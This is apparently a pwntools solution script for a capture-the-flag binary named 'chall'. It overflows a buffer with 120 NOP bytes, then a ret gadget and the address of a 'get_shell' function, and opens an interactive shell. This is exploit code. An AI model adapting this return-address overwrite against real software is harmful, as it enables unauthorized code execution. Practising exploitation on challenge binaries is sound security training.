from pwn import *

exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

sh = process(exe)

padding = 120
p = flat([
    asm('nop') * padding,
    0x000000000040101a,
    elf.sym['get_shell']
])

sh.sendline(p)
sh.interactive()